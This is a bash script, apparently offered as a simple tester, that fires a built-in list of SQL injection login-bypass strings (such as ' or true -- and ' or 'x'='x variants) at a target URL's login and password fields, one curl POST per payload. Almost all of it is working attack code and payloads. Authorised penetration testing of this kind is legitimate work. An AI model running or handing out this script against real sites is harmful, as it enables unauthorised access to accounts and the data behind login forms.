#!/bin/bash

#. Author:  AurÃ©lien DUBUS
#. Description : Simple script to test for authentication bypass with simple sqli



file="list.txt"

cat >> ${file} << _EOF_
' or true --
'-'
' '
'&'
'^'
'*'
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
"-"
" "
"&"
"^"
"*"
" or ""-"
" or "" "
" or ""&"
" or ""^"
" or ""*"
or true--
" or true--
' or true--
") or true--
') or true--
' or 'x'='x
') or ('x')=('x
')) or (('x'))=(('x
" or "x"="x
") or ("x")=("x
")) or (("x"))=(("x
_EOF_

echo "What is the login parameter ?"
read log
echo "What is the password parameter?"
read password

while getopts "u:" opt; do
  case $opt in
    u | url) url="$OPTARG"
            #echo "${url}"
            cat ${file} | while read line
            do
                curl --data "${log}=${line}&${password}=--'" "${url}"
            done
      ;;
    p)
     ;;
  esac
done

rm ${file}

exit 0
